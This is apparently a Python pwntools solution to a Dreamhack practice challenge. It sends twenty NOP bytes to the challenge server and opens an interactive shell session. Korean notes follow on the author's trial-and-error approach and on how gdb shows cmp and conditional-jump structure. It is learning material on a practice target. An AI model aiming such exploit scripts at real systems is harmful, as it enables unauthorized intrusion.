#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 15514)

prefix = "\x90"*20

p.send(prefix)
p.interactive()

"""
C 파일을 확인하지 않고 풀기위해 이것저것 값을 집어넣다가 얻어걸렸다.
다른 풀이를 보다보니 pwntools을 사용할 때 다음과 같은 방법도 있더라..
p.sendlineafter("Name: ", 'a' * 20)

어쨋든 C 파일을 통해 내용을 확인해보고 gdb로 다시 확인해보니 if문의 형태를 알 수 있었다.
그동안 주로 IDA로만 확인해서 눈에 잘 안익었는데 이번 기회를 통해 어느정도 이해할 수 있는 기회였다고 생각하자..

cmp <condition>
조건부 점프(je, jne 등등)
조건에 해당되지 않을 경우 실행할 명령

형식으로 구성되어 있었다.
"""
